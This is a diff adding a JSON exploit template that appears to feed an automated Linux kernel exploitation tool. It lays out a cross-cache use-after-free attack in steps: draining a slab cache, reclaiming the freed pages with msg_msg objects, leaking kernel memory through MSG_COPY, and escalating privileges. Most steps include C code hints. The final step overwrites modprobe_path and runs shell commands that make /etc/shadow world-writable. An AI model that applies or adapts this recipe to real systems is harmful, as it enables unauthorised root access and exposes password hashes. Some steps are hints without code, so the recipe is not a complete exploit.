@@ -1,0 +1,56 @@
+{
+  "name": "cross_cache_uaf",
+  "description": "UAF exploited via cross-cache attack when the vulnerable object is in a dedicated (non-generic) slab cache. Drain the slab cache to return pages to the page allocator, then reclaim those pages with objects from a different cache (e.g., pipe_buffer or msg_msg) to achieve type confusion.",
+  "target_struct": "varies (type-confused)",
+  "slab_cache": "dedicated cache -> page allocator -> generic kmalloc",
+  "technique": "cross_cache_attack",
+  "vuln_types": ["uaf", "double-free"],
+  "kernel_versions": "5.4+",
+  "detection_rules": {
+    "required_symbols": ["msgsnd", "pipe", "socket", "setsockopt"],
+    "crash_functions": ["kmem_cache_free", "kmem_cache_alloc", "slab_free", "___slab_alloc"],
+    "slab_caches": ["dedicated"],
+    "struct_fields": []
+  },
+  "steps": [
+    {
+      "name": "trigger_uaf",
+      "description": "Trigger the use-after-free. The freed object is in a dedicated slab cache, so normal kmalloc sprays won't reclaim it directly.",
+      "code_hint": "// Trigger the vulnerability to create a dangling reference\n// The object is in a dedicated cache (e.g., 'filp', 'inode_cache')"
+    },
+    {
+      "name": "drain_slab_cache",
+      "description": "Exhaust all free slots in the dedicated slab cache so the allocator must allocate new slab pages. This is done by allocating many objects of the same type.",
+      "code_hint": "#define DRAIN_COUNT 512\n// Allocate many objects of the same type as the vulnerable object\n// Example for file objects: open many files\nint drain_fds[DRAIN_COUNT];\nfor (int i = 0; i < DRAIN_COUNT; i++)\n    drain_fds[i] = open(\"/dev/null\", O_RDONLY);"
+    },
+    {
+      "name": "free_slab_pages",
+      "description": "Free all the drain objects to return full slab pages to the page allocator. The freed UAF object's page is now in the buddy allocator.",
+      "code_hint": "// Free the drain objects\nfor (int i = 0; i < DRAIN_COUNT; i++)\n    close(drain_fds[i]);\n// The slab pages containing our freed object are returned to page allocator"
+    },
+    {
+      "name": "cross_cache_reclaim",
+      "description": "Allocate objects from a generic kmalloc cache (same size) to reclaim the freed pages. Use msg_msg, pipe_buffer, or other controllable structures.",
+      "code_hint": "// Reclaim with msg_msg (controllable content, variable size)\n#define RECLAIM_COUNT 256\nstruct { long mtype; char mtext[VULN_OBJ_SIZE - 48]; } msg;\nmsg.mtype = 1;\nint qids[RECLAIM_COUNT];\nfor (int i = 0; i < RECLAIM_COUNT; i++) {\n    qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);\n    memset(msg.mtext, 'B' + (i % 26), sizeof(msg.mtext));\n    msgsnd(qids[i], &msg, sizeof(msg.mtext), 0);\n}"
+    },
+    {
+      "name": "corrupt_reclaimed_object",
+      "description": "Use the original dangling pointer to corrupt the cross-cache reclaimed object (e.g., overwrite msg_msg header fields or pipe_buffer.ops).",
+      "code_hint": "// Write through the dangling pointer to corrupt the reclaimed msg_msg\n// The dangling pointer now overlaps with a msg_msg in the reclaimed page"
+    },
+    {
+      "name": "derive_arb_read_write",
+      "description": "Leverage the corrupted object to build arbitrary read/write primitives. For msg_msg: corrupt m_list.next for OOB read via MSG_COPY. For pipe_buffer: corrupt ops pointer.",
+      "code_hint": "// If msg_msg: leak via msgrcv with MSG_COPY\nchar leak[8192];\nfor (int i = 0; i < RECLAIM_COUNT; i++) {\n    ssize_t n = msgrcv(qids[i], leak, sizeof(leak), 0, MSG_COPY | IPC_NOWAIT);\n    if (n > EXPECTED_SIZE) {\n        // We got OOB data - parse for kernel pointers\n        break;\n    }\n}"
+    },
+    {
+      "name": "escalate_privileges",
+      "description": "Use the read/write primitive to escalate: overwrite modprobe_path, current->cred, or build a ROP chain for commit_creds(init_cred).",
+      "code_hint": "// Overwrite modprobe_path to /tmp/pwn\narb_write(kernel_base + modprobe_path_offset, \"/tmp/pwn\", 9);\n// Create trigger: unknown binary format invokes modprobe\nsystem(\"echo '#!/bin/sh\\nchmod 777 /etc/shadow' > /tmp/pwn && chmod +x /tmp/pwn\");\nsystem(\"echo '\\xff\\xff\\xff\\xff' > /tmp/trigger && chmod +x /tmp/trigger\");\nsystem(\"/tmp/trigger\");"
+    }
+  ],
+  "references": [
+    "https://www.willsroot.io/2022/01/cve-2022-0185.html",
+    "https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/"
+  ]
+}
